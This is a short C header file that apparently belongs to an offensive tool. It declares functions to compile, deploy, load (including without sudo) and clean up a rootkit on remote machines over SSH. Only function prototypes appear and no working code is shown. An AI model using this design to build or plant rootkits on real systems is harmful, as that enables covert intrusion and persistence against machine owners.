#ifndef ROOTKIT_H
#define ROOTKIT_H

#include "ssh_utils.h"

int create_and_compile_rootkit(ssh_session session);
int deploy_rootkit_with_vim(ssh_session session);
int cleanup_rootkit_files(ssh_session session);
int load_rootkit_direct_ssh(ssh_session session, const char *rootkit_path);
int deploy_userland_rootkit(ssh_session session);
int load_rootkit_without_sudo(ssh_session session, const char *rootkit_path);

#endif // ROOTKIT_H
